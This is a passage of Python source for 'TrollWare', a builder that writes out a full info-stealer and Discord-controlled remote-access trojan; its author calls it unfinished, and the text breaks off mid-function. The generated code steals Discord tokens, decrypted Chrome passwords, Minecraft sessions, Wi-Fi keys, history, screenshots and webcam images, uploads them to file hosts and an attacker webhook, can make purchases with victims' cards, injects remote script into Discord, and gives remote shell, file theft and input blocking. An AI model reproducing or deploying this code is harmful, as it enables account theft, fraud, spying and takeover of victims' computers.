""" Note: THIS IS UNFINISHED AND WILL MOST LIKELY NOT WORK ATM... """
""" * I still need to add many features (switch options in builder, etc.) so please wait on that. """

from os import name, chdir, rmdir, mkdir, rename, listdir
from os.path import isdir
from random import choice, shuffle, randint
from binascii import hexlify
from shutil import rmtree



class Grabber:
    """ TrollWare Grabber & RAT Code """

    def TrollWare(webhook: str, bottoken: str) -> str:
        return r'''

import win32crypt
import subprocess
import requests
import platform
import discord
import sqlite3
import cpuinfo
import getpass
import socket
import shutil
import ctypes
import psutil
import base64
import uuid
import json
import cv2
import re
import os
from ctypes import windll
from PIL import ImageGrab
from discord.ext import commands
from subprocess import Popen, PIPE
from cpuinfo import get_cpu_info as gci


YELLOW =  0xfffb00 
BLACK  =  0x000000
WHITE  =  0xffffff
GREEN  =  0x00ff00
GREY   =  0x36393f
BLUE   =  0x0000ff
PINK   =  0xff00ee
RED    =  0xff1100

RUNRAT     =   True
LOGSYSTEM  =   True
SENDHIST   =   True  
PCSCRAPE   =   True  
CAMERAPIC  =   True  
BUY_NITRO  =   False  
DISCINJECT =   False  
EMBEDCOLOR =   GREY    

WEBHOOK    =   ''' + webhook + r'''
BOTTOKEN   =   ''' + bottoken + r'''

class Program():

    class Logger():
        def __init__(self, webhook):
            self.hook = webhook
            self.tokens = []


        def UploadFile(self, filepath):
            server = 'https://store4.gofile.io/uploadFile'
            file = {'file': open(filepath, "rb")}
            try:
                r = requests.post(server, files=file)
                resp = r.json()
                filelink = f"[File]({resp['data']['downloadPage']})"
            except:filelink = "Error"
            return filelink


        def GetTokens(self):
            LOCAL = os.getenv("LOCALAPPDATA")
            ROAMING = os.getenv("APPDATA")
            PATHS = {
                "Discord"               : ROAMING + "\\Discord",
                "Discord Canary"        : ROAMING + "\\discordcanary",
                "Discord PTB"           : ROAMING + "\\discordptb",
                "Google Chrome"         : LOCAL + "\\Google\\Chrome\\User Data\\Default",
                "Opera"                 : ROAMING + "\\Opera Software\\Opera Stable",
                "Brave"                 : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                "Yandex"                : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
                'Lightcord'             : ROAMING + "\\Lightcord",
                'Opera GX'              : ROAMING + "\\Opera Software\\Opera GX Stable",
                'Amigo'                 : LOCAL + "\\Amigo\\User Data",
                'Torch'                 : LOCAL + "\\Torch\\User Data",
                'Kometa'                : LOCAL + "\\Kometa\\User Data",
                'Orbitum'               : LOCAL + "\\Orbitum\\User Data",
                'CentBrowser'           : LOCAL + "\\CentBrowser\\User Data",
                '7Star'                 : LOCAL + "\\7Star\\7Star\\User Data",
                'Sputnik'               : LOCAL + "\\Sputnik\\Sputnik\\User Data",
                'Vivaldi'               : LOCAL + "\\Vivaldi\\User Data\\Default",
                'Chrome SxS'            : LOCAL + "\\Google\\Chrome SxS\\User Data",
                'Epic Privacy Browser'  : LOCAL + "\\Epic Privacy Browser\\User Data",
                'Microsoft Edge'        : LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
                'Uran'                  : LOCAL + "\\uCozMedia\\Uran\\User Data\\Default",
                'Iridium'               : LOCAL + "\\Iridium\\User Data\\Default\\Local Storage\\leveld",
                'Firefox'               : ROAMING + "\\Mozilla\\Firefox\\Profiles",
            }
            
            for platform, path in PATHS.items():
                path += "\\Local Storage\\leveldb"
                if os.path.exists(path):
                    for file_name in os.listdir(path):
                        if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                    for token in re.findall(regex, line):
                                        if token + " | " + platform not in self.tokens:
                                            self.tokens.append(token + " | " + platform)


        def GetBilling(self, token):
            try:
                response = requests.get(f'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers={"content-type": "application/json", "authorization": token})
                billingmail = response.json()[0]['email']
                billingname = response.json()[0]['billing_address']['name']
                address_1 = response.json()[0]['billing_address']['line_1']
                address_2 = response.json()[0]['billing_address']['line_2']
                city = response.json()[0]['billing_address']['city']
                state = response.json()[0]['billing_address']['state']
                postal = response.json()[0]['billing_address']['postal_code']
                return f"""• Name: {billingname}\n• Email: {billingmail}\n• Address: {address_1}, {address_2}\n• City/State: {city} / {state}\n• Postal Code: {postal}"""
            except:return "• Couldn't get Billing"


        def GetUserInfo(self, token):
            try:
                return requests.get("https://discordapp.com/api/v9/users/@me", headers={"content-type": "application/json", "authorization": token}).json()
            except:return None


        def BuyNitro(self, token):
            try:
                r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})
                if r.status_code == 200:
                    payment_source_id = r.json()[0]['id']
                    if '"invalid": true' in r.text:
                        r = requests.post(f'https://discord.com/api/v6/store/skus/521847234246082599/purchase', headers={'Authorization': token}, json={'expected_amount': 1,'gift': True,'payment_source_id': payment_source_id})   
                        return r.json()['gift_code']
            except:return "None"


        def CheckFriends(self, token):
            friends = ""
            try:
                req = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={"content-type": "application/json", "authorization": token}).json()

                for user in req:
                    badge = ""
                    if user["user"]["public_flags"] == 1:badge = "Staff"
                    elif user["user"]["public_flags"] == 2:badge = "Partner"
                    elif user["user"]["public_flags"] == 4:badge = "Hypesquad Events"
                    elif user["user"]["public_flags"] == 8:badge = "BugHunter 1"
                    elif user["user"]["public_flags"] == 512:badge = "Early"
                    elif user["user"]["public_flags"] == 16384:badge = "BugHunter 2"
                    elif user["user"]["public_flags"] == 131072:badge = "Developer"
                    else:badge = ""

                    if badge != "":friends += badge + " | " + user['id'] + "\n"            
                if friends == "":friends += "❌"            
                return friends
            except:return "❌"


        def Account(self):
            embeds = []
            for token_line in self.tokens:
                try:
                    token = token_line.split(" | ")[0]
                    tokenplatform = token_line.split(" | ")[1]
                    accountinfo = self.GetUserInfo(token)
                    rarefriends = self.CheckFriends(token)
                    username = accountinfo["username"] + "#" + accountinfo["discriminator"]
                    user_id = accountinfo["id"]
                    user_avatar = accountinfo["avatar"]
                    email = accountinfo["email"] or "❌"
                    phone = accountinfo["phone"] or "❌"
                    billingbool = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers={"content-type": "application/json", "authorization": token}).text)) > 0)
                    mfabool = accountinfo["mfa_enabled"]

                    try:user_banner = accountinfo["banner"]
                    except:user_banner = None

                    if billingbool:billing = "✔️"
                    else:billing = "❌"
                    if billingbool:billinginfo = self.GetBilling()
                    else:billinginfo = "❌"

                    if mfabool == True:mfa = "✔️"
                    else:mfa = "❌"

                    badges = ""
                    flags = accountinfo['flags']
                    if (flags == 1):badges += "Staff, "
                    if (flags == 2):badges += "Partner, "
                    if (flags == 4):badges += "Hypesquad Event, "
                    if (flags == 8):badges += "Green Bughunter, "
                    if (flags == 64):badges += "Hypesquad Bravery, "
                    if (flags == 128):badges += "HypeSquad Brillance, "
                    if (flags == 256):badges += "HypeSquad Balance, "
                    if (flags == 512):badges += "Early Supporter, "
                    if (flags == 16384):badges += "Gold BugHunter, "
                    if (flags == 131072):badges += "Verified Bot Developer, "
                    if (badges == ""):badges = "None"   
             
                    try:
                        if accountinfo["premium_type"] == "1" or accountinfo["premium_type"] == 1:nitro_type = "✔️ Nitro Classic"
                        elif accountinfo["premium_type"] == "2" or accountinfo["premium_type"] == 2:nitro_type = "✔️ Nitro Boost"
                        else:nitro_type = "None"
                    except:nitro_type = "None"

                    if BUY_NITRO:
                        nitrobuy = self.BuyNitro(token)
                        if nitrobuy == "None":nitrocode = "Nitro Code: None"
                        else:nitrocode = "Nitro Code: ✔️ discord.gift/" + nitrobuy
                    else:nitrocode = "Nitro Code: None"

                    embed = {
                        "color": EMBEDCOLOR,
                        "fields": [
                            {
                                "name": "**Account Information**",
                                "value": f"```• User  ➢ {username}\n• ID    ➢ {user_id}\n• Email ➢ {email}\n• Phone ➢ {phone}```"
                            },
                            {
                                "name": "**Account Settings**",
                                "value": f"```• Nitro   ➢ {nitro_type}\n• Badges  ➢ {badges}\n• Billing ➢ {billing}\n• 2FA     ➢ {mfa}```"
                            },
                            {
                                "name": "**Billing**",
                                "value": f"```{billinginfo}```"
                            },
                            {
                                "name": "**Rare Friends:**",
                                "value": f"```{rarefriends}```"
                            },
                            {
                                "name": f"**Token ({tokenplatform})**",
                                "value": f"```{token}```"
                            }
                        ],
                        "author": {
                            "name": f"Victim ✔️ {username}",
                            "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                        },
                        "footer": {
                            "text": f"• github.com/codeuk/trollware  •  {nitrocode}",
                            "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                        },
                        "image": {
                            "url": f"https://cdn.discordapp.com/banners/{user_id}/{user_banner}?size=1024"
                        },
                    }
                    embeds.append(embed)                
                except Exception as error:print(error)
            requests.post(self.hook, headers={"content-type": "application/json"}, data=json.dumps({"content": "**New TrollWare Connection**","embeds": embeds,"username": "TrollWare","avatar_url": "https://c.tenor.com/OV7-yjnRMw8AAAAM/glaza-polzyt-troll.gif"}).encode())


        def EncryptionKey(self):
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                    "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            mkey = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            mkey = mkey[5:]
            mkey = win32crypt.CryptUnprotectData(mkey, None, None, None, 0)[1]
            return mkey


        def DecryptPass(self, password, key):
            try:
                iv = password[3:15]
                password = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:return ""


        def PasswordStealer(self):
            try:
                f = open('C:\ProgramData\Chrome.txt', 'a+', encoding="utf-8")
                key = self.EncryptionKey()
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
                filename = "C:\ProgramData\ChromeData.db"
                shutil.copyfile(db_path, filename)
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                for row in cursor.fetchall():
                    origin_url = row[0] 
                    username = row[2]
                    password = self.DecryptPass(row[3], key)     
                    if username or password:
                        f.write("─────────────────────────[TROLLWARE]─────────────────────────\n \nUSER:: %s \nPASS:: %s \nFROM:: %s \n \n" % (username, password, origin_url))
                    else:
                        continue
                f.close()
                cursor.close()
                db.close()
                os.remove(filename)
                passlink = self.UploadFile('C:\ProgramData\Chrome.txt')
                return passlink
            except:return "Error"

        def MinecraftStealer(self):
            accountlocations = [
                f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\.minecraft\\launcher_accounts.json',
                f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
            ]
            mcfile = open("C:\ProgramData\Minecraft.txt", 'a+', encoding="utf-8")
            for location in accountlocations:
                if os.path.exists(location):
                    auth_db = json.loads(open(location).read())['accounts']

                    for d in auth_db:
                        sessionKey = auth_db[d].get('accessToken')
                        if sessionKey == "":
                            sessionKey = "None"
                        username = auth_db[d].get('minecraftProfile')['name']
                        sessionType = auth_db[d].get('type')
                        email = auth_db[d].get('username')
                        if sessionKey != None or '':
                            mcfile.write("─────────────────────────[TROLLWARE]─────────────────────────\n \nUsername: %s \nEmail: %s \nSession: %s \nToken: %s \n \n" % (username, email, sessionType, sessionKey))
                            mcfile.write("Username: " + username + ", Session: " + sessionType + ", Email: " + email + ", Token: " + sessionKey)
            mcfile.close()
            mclink = self.UploadFile("C:\ProgramData\Minecraft.txt")
            return mclink
            

        def TokenFile(self):
            try:
                tokenfile = open("C:\ProgramData\\tokenfile.txt", "a+", encoding="utf-8")
                for token_line in self.tokens:
                    tokenfile.write(f'{token_line}\n')
                tokenfile.close()
                return self.UploadFile("C:\ProgramData\\tokenfile.txt")
            except:return "Error"


        def Screenshot(self):
            screenshot = ImageGrab.grab()
            screenshot.save("C:\ProgramData\Screenshot.jpg")
            return self.UploadFile("C:\ProgramData\Screenshot.jpg")


        def CameraPic(self):
            if CAMERAPIC:
                try:
                    camera = cv2.VideoCapture(0)
                    camerapath = 'C:\ProgramData\Camera.jpg'
                    return_value,image = camera.read()
                    gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
                    cv2.imwrite(camerapath,image)
                    camera.release()
                    cv2.destroyAllWindows()
                    return self.UploadFile(camerapath)
                except:return "No Camera"
            else:return "False"


        def PCScrape(self):
            if PCSCRAPE:
                f = open("C:\ProgramData\PCScrape.txt", "w+", encoding="utf-8")
                scrapecmds={
                    "Current User":"whoami /all",
                    "Local Network":"ipconfig /all",
                    "FireWall Config":"netsh firewall show config",
                    "Online Users":"quser",
                    "Local Users":"net user",
                    "Admin Users": "net localgroup administrators",
                    "Anti-Virus Programs":r"WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState,pathToSignedProductExe",
                    "Port Information":"netstat -ano",
                    "Routing Information":"route print",
                    "Hosts":"type c:\Windows\system32\drivers\etc\hosts",
                    "WIFI Networks":"netsh wlan show profile",
                    "Startups":"wmic startup get command, caption",
                    "DNS Records":"ipconfig /displaydns",
                    "User Group Information":"net localgroup",
                }   
                for key,value in scrapecmds.items():
                    f.write('\n──────TROLLWARE──────[%s]──────TROLLWARE──────'%key)
                    cmd_output = os.popen(value).read()
                    f.write(cmd_output)
                f.close()
                return self.UploadFile("C:\ProgramData\PCScrape.txt")
            else:return "False"


        def BrowserHistory(self):
            if SENDHIST:
                try:
                    history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
                    login_db = os.path.join(history_path, 'History')
                    shutil.copyfile(login_db, "C:\ProgramData\histdb.db")
                    c = sqlite3.connect("C:\ProgramData\histdb.db")
                    cursor = c.cursor()
                    select_statement = "SELECT title, url FROM urls"
                    cursor.execute(select_statement)
                    history = cursor.fetchall()
                    with open('C:\ProgramData\History.txt', "w+", encoding="utf-8") as f:
                        f.write('─────────────────────[TROLLWARE]─────────────────────' + '\n' + '\n')
                        for title, url in history:
                            f.write(f"Title: {str(title.encode('unicode-escape').decode('utf-8')).strip()}\nURL: {str(url.encode('unicode-escape').decode('utf-8')).strip()}" + "\n" + "\n" + "─────────────────────[TROLLWARE]─────────────────────"+ "\n" + "\n")
                        f.close()
                    c.close()
                    os.remove("C:\ProgramData\histdb.db")
                    histlink = self.UploadFile('C:\ProgramData\History.txt')
                    return histlink
                except:return "Error"
            else:return "False"


        def Injection(self):
            if DISCINJECT:
                position = "Not Injected"
                for proc in psutil.process_iter():
                    if any(procstr in proc.name().lower() for procstr in ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):
                        proc.kill()
                for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
                    for name in dirs:
                        if "discord_desktop_core-" in name:
                            try:
                                directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                                try:os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\TrollWare"))
                                except:pass
                            except FileNotFoundError:
                                pass
                            f = requests.get("https://pastebin.com/raw/TC1vWRhG").text.replace("%WEBHOOK_LINK%", self.hook)
                            with open(directory_list, 'w', encoding="utf-8") as index_file:
                                index_file.write(f)
                                position = "Injected"
                for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
                    for name in files:
                        discord_file = os.path.join(root, name)
                        os.startfile(discord_file)
                        position = "Injected & Restarted"
            else:
                position = "Not Injected"

            return position


        def GetLocalIP(self):
            hostname = socket.gethostname()    
            localip = socket.gethostbyname(hostname)    
            return localip

        def GetWiFi(self):
            try:
                wifidata = ''
                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
                profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
                for i in profiles:
                    try:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                        try:wifidata += '{:} - {:}'.format(i, results[0])
                        except IndexError:wifidata += '{:} - {:}'.format(i, "No Password")
                    except subprocess.CalledProcessError:wifidata += '{:} - {:}'.format(i, "ENCODING ERROR")
                    wifidata += '\n'
                return wifidata
            except:return "Wifi Password Error"


        def System(self):
            embeds = []
            if LOGSYSTEM:
                try:
                    winversion = platform.platform()
                    data = requests.get("http://ipinfo.io/json").json()
                    ip = data['ip']
                    city = data['city']
                    country = data['country']
                    hostname = os.getenv("COMPUTERNAME")
                    pcusername = os.getenv("UserName")
                    ram = round(psutil.virtual_memory().total/1000000000, 2)
                    cpubrand = gci()['brand_raw']
                    cpucores = psutil.cpu_count(logical=False)
                    macaddr = (':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]))
                    try:
                        macvendor=requests.get(f'https://api.macvendors.com/{macaddr}').text
                        if "error" in macvendor:macvendor="Error"
                    except:macvendor="Error"

                    scrapelink  =  self.PCScrape()
                    cameralink  =  self.CameraPic()
                    tokenlink   =  self.TokenFile()
                    passlink    =  self.PasswordStealer()
                    histlink    =  self.BrowserHistory()
                    sslink      =  self.Screenshot()
                    mclink      =  self.MinecraftStealer()

                    injection   =  self.Injection()
                    localip     =  self.GetLocalIP()
                    wifidata    =  self.GetWiFi()

                    try:
                        p = Popen("wmic path win32_VideoController get name", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
                        gpu = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")
                    except:gpu = "Error"

                    embed = {
                        "color": EMBEDCOLOR,
                        "fields": [
                            {
                                "name": "**PC Information**",
                                "value": f"```• HostName ➢ {hostname}\n• Username ➢ {pcusername}\n• Version  ➢ {winversion}```"
                            },
                            {
                                "name": "**Hardware Information**",
                                "value": f"```• RAM ➢ {ram} GB\n• CPU ➢ {cpubrand}\n• CPU ➢ {cpucores} Cores\n• GPU ➢ {gpu}```"
                            },
                            {
                                "name": "**Network Information**",
                                "value": f"```• MAC Addr ➢ {macaddr}\n• Vendor   ➢ {macvendor}\n• Local IP ➢ {localip}\n• IP Addr  ➢ {ip}\n• Region   ➢ {country}\n• City     ➢ {city}\n```"
                            },
                            {
                                "name": "** Wifi Passwords**",
                                "value": f"```{wifidata}```"
                            },
                            {
                                "name": f"**Files**",
                                "value": f"** • Camera: *{cameralink}***\n** • History: *{histlink}***\n** • PC Scrape: *{scrapelink}***\n** • Passwords: *{passlink}***\n** • Raw Tokens: *{tokenlink}***\n** • Screenshot: *{sslink}***\n** • Minecraft Accounts: *{mclink}***\n"
                            }
                        ],
                        "author": {
                            "name": f"✔️ System Information",
                        },
                        "footer": {
                            "text": f"• github.com/codeuk/trollware  •  Discord: {injection}"
                        },
                    }
                    embeds.append(embed)                
                except Exception as e:print(e)      
            requests.post(self.hook, headers={"content-type": "application/json"}, data=json.dumps({"content": " ","embeds": embeds,"username": "TrollWare","avatar_url": "https://c.tenor.com/OV7-yjnRMw8AAAAM/glaza-polzyt-troll.gif"}).encode())


    class RAT():
        def __init__(self, bottoken):
            self.token           = bottoken
            self.WM_SYSCOMMAND   = 274
            self.HWND_BROADCAST  = 65535
            self.SC_MONITORPOWER = 61808

        def SendResp(self, command, message):
            embed = discord.Embed(title = "TrollWare :clown:", color=EMBEDCOLOR)
            embed.add_field(name = f">{command}", value = message,  inline= False)
            return embed

        def Tasks(self):
            os.system('echo tasklist > C:\\ProgramData\\tasks.txt')
            f = open("C:\\ProgramData\\tasks.txt", "w")
            f.write(os.popen('tasklist').read())
            f.close()

        def Drivers(self):
            os.system('echo cmd > C:\\ProgramData\\drivers.txt')
            f = open("C:\\ProgramData\\drivers.txt", "w")
            f.write(os.popen('DRIVERQUERY').read())
            f.close()

        def Setup(self):
            TrollWare = commands.Bot(command_prefix=">")
            ip = requests.get('https://api.ipify.org').text
            pcname = os.getenv("COMPUTERNAME")

            @TrollWare.command()
            async def menu(ctx):
                embed = discord.Embed(title = f"{pcname} @ {ip}", color=EMBEDCOLOR)
                embed.add_field(name = ">shell :dart:", value = "RCE and control files",  inline= False)
                embed.add_field(name = ">spying :camera:", value = "Spy and change windows customization",  inline= False)
                embed.add_field(name = ">system :knife:", value = "Gather information on the PC",  inline= False)
                embed.add_field(name = ">admin :lock:", value = "Commands which require admin permissions",  inline= False)
                embed.add_field(name = ">misc :man_shrugging:", value = "Miscellaneous Commands",  inline= False)
                embed.add_field(name = ">trollware :clown:", value = "TrollWare Related Commands",  inline= False)
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def shell(ctx):
                embed = discord.Embed(title = "Shell Commands :dart:", color=EMBEDCOLOR)
                embed.add_field(name = ">cmd <command> <embed/file>", value = "Executes Custom Command ~ outputs as (embed/file)",  inline= False)
                embed.add_field(name = ">download <file>", value = "Downloads File from Victims PC",  inline= False)
                embed.add_field(name = ">upload <attachment> <filename>", value = "Upload File to TEMP Directory",  inline= False)
                embed.add_field(name = ">read <file> <embed/file>", value = "Sends File Content ~ outputs as (embed/file)",  inline= False)
                embed.add_field(name = ">delete <file>", value = "Removes File from Victims PC",  inline= False)
                embed.add_field(name = ">endtask <taskname>", value = "Ends a Custom Process",  inline= False)
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def spying(ctx):			
                embed = discord.Embed(title = "Surveillance Commands :camera:", color=EMBEDCOLOR)
                embed.add_field(name = ">monitoroff", value = "Turns off Monitor",  inline= False)
                embed.add_field(name = ">monitoron", value = "Turns on Monitor",  inline= False)
                embed.add_field(name = ">screenshot", value = "Sends Victims Screen",  inline= False)
                embed.add_field(name = ">camera", value = "Sends Victims Webcam",  inline= False)
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def system(ctx):
                embed = discord.Embed(title = "System Commands :knife:", color=EMBEDCOLOR)
                embed.add_field(name = ">scrapecomputer", value = "Sends full PC Scrape",  inline= False)
                embed.add_field(name = ">systeminfo", value = "Sends SystemInfo",  inline= False)
                embed.add_field(name = ">drivers", value = "Sends Driver Info",  inline= False)
                embed.add_field(name = ">tasks", value = "Sends Running Processes",  inline= False)
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def admin(ctx):
                embed = discord.Embed(title = "Admin Commands :lock:", color=EMBEDCOLOR)
                embed.add_field(name = ">blockinput", value = "Blocks Keyboard and Mouse input",  inline= False)
                embed.add_field(name = ">unblockinput", value = "Unblocks Keyboard and Mouse input",  inline= False)
                embed.add_field(name = ">criticalproc", value = "Makes process bluescreen if closed",  inline= False)
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def misc(ctx):
                embed = discord.Embed(title = "Miscellaneous Commands :man_shrugging:", color=EMBEDCOLOR)
                embed.add_field(name = ">admincheck", value = "Checks File Admin Privileges",  inline= False)			
                embed.add_field(name = ">setwallpaper <attachment>", value = "Sets Victims Wallpaper to your Attachment",  inline= False)
                embed.add_field(name = ">saymessage <message>", value = "Voices message on Victims machine",  inline= False)
                embed.add_field(name = ">messagebox <message>", value = "Shows a custom MessageBox",  inline= False)        
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def trollware(ctx):
                embed = self.SendResp("credits", "Credits for TrollWare")
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def monitoroff(ctx):
                ctypes.windll.user32.SendMessageW(self.HWND_BROADCAST, self.WM_SYSCOMMAND, self.SC_MONITORPOWER, -1)
                embed = self.SendResp("monitoroff", "```✔️ Monitor Turned off```")
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def monitoron(ctx):
                ctypes.windll.user32.SendMessageW(self.HWND_BROADCAST, self.WM_SYSCOMMAND, self.SC_MONITORPOWER, 2)
                embed = self.SendResp("monitoron", "```✔️ Monitor Turned on```")
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def tasks(ctx):
                self.Tasks()
                embed = self.SendResp("tasks", "```✔️ Sending tasks.txt```")
                await ctx.send(embed = embed)
                await ctx.send(file=discord.File(r'C:\\ProgramData\\tasks.txt'))
                os.remove('C:\\ProgramData\\taskdata.txt')

            @TrollWare.command()
            async def camera(ctx):
                cameralink = Program.Logger.CameraPic(self)
                embed = self.SendResp("camera", f"```✔️ {cameralink}```")
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def credits(ctx):
                embed = discord.Embed(title = f"TrollWare Credits", color=EMBEDCOLOR)
                embed.add_field(name = "Websites", value = f"**https://doop.fun**\n**https://trollware.doop.fun**",  inline=False)
                embed.add_field(name = "Github", value = f"**https://github.com/codeuk**\n**https://github.com/codeuk/trollware**",  inline=False)
                embed.add_field(name = "Discord", value = f"**https://discord.com/users/900072916597735444**",  inline=False)
                await ctx.send(embed = embed)                 

            @TrollWare.command()
            async def cmd(ctx, customcommand, output_type):
                output = os.popen(f'{customcommand}').read()
                if output_type == "embed":
                    embed = self.SendResp("cmd", f"```✔️ {output}```")
                    await ctx.send(embed = embed)
                else:
                    os.system('echo cmd > C:\\ProgramData\\cmd.txt')
                    f = open("C:\\ProgramData\\cmd.txt", "w")
                    f.write(output)
                    f.close()
                    embed = self.SendResp("cmd", f"```✔️ Sending cmd.txt```")
                    await ctx.send(embed = embed)
                    await ctx.send(file=discord.File(r'C:\\ProgramData\\cmd.txt'))
                    os.remove('C:\\ProgramData\\cmd.txt')

            @TrollWare.command()
            async def blockinput(ctx):
                try:	
                    windll.user32.BlockInput(True)
                    embed = self.SendResp("upload", f"```✔️ Blocked Input```")    
                except Exception as e:
                    embed = self.SendResp("Error", f"```❌ {e}```")         
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def unblockinput(ctx):
                try:	
                    windll.user32.BlockInput(False)
                    embed = self.SendResp("upload", f"```✔️ Unblocked Input```")    
                except Exception as e:
                    embed = self.SendResp("Error", f"```❌ {e}```")         
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def setwallpaper(ctx):
                path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
                await ctx.message.attachments[0].save(path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                embed = self.SendResp("wallpaper", f"```✔️ Set Wallpaper```")
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def messagebox(ctx, message):
                os.system('powershell "(new-object -ComObject wscript.shell).Popup(\\"{}\\",0,\\"Windows\\")"'.format(message))
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                embed = self.SendResp("messagebox", f"```✔️ MessageBox Sent```")
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def upload(ctx, filename):
                try:
                    path = os.path.join(os.getenv('TEMP') + f"\\{filename}")
                    await ctx.message.attachments[0].save(path)
                    embed = self.SendResp("upload", f"```✔️ Uploaded file to {path}```")
                    await ctx.send(embed = embed)
                except:
                    embed = self.SendResp("upload", f"```❌ Couldn't Upload file```")
                    await ctx.send(embed = embed)               

            @TrollWare.command()
            async def screenshot(ctx):
                sslink = Program.Logger.Screenshot(self)
                embed = self.SendResp("screenshot", f"```✔️ {sslink}```")
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def scrapecomputer(ctx):
                scrapelink = Program.Logger.PCScrape(self)
                embed = self.SendResp("scrapecomputer", f"```✔️ {scrapelink}```")
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def systeminfo(ctx):
                driverinfo = os.popen('SYSTEMINFO').read()
                os.system('echo cmd > C:\\ProgramData\\systeminfo.txt')
                f = open("C:\\ProgramData\\systeminfo.txt", "w")
                f.write(driverinfo)
                f.close()
                embed = self.SendResp("systeminfo", f"```✔️ Sending Data```")
                await ctx.send(embed = embed)
                await ctx.send(file=discord.File(r'C:\\ProgramData\\systeminfo.txt'))
                os.remove('C:\\ProgramData\\systeminfo.txt')

            @TrollWare.command()
            async def saymessage(ctx, message):
                import win32com.client
                win32com.client.Dispatch("SAPI.SpVoice").Speak(message)
                embed = self.SendResp("saymessage", f"```✔️ Voiced '{message}'```")
                await ctx.send(embed = embed)

            @TrollWare.command()
            async def criticalproc(ctx):
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
                    embed = self.SendResp("criticalproc", "```✔️ Process is now Critical```")
                    await ctx.send(embed = embed)
                else:
                    embed = self.SendResp("criticalproc", "```❌ You need Admin Privileges```")
                    await ctx.send(embed = embed)

            @TrollWare.command()
            async def read(ctx, file, output_type):
                filedata = open(file, "r").read()
                if output_type == "embed":
                    embed = self.SendResp("download", f"```✔️ {filedata}```")
                    await ctx.send(embed = embed)
                else:
                    os.system('echo files > C:\\ProgramData\\readdata.txt')
                    f = open("C:\\ProgramData\\readdata.txt", "w")
                    f.write(filedata)
                    f.close()
                    embed = self.SendResp("download", f"```✔️ Read {file}```")
                    await ctx.send(embed = embed)
                    await ctx.send(file=discord.File(r'C:\\ProgramData\\readdata.txt'))
                    os.remove('C:\\ProgramData\\readdata.txt')
        
            @TrollWare.command()
            async def download(ctx, filepath):
                embed = self.SendResp("download", f"```✔️ Downloaded {filepath}```")
                await ctx.send(embed = embed)
                await ctx.send(file=discord.File(fr'{filepath}'))
            
            @TrollWare.command()
            async def delete(ctx, file):
                os.remove(file)
                embed = self.SendResp("delete", f"```✔️ Deleted {file}```")
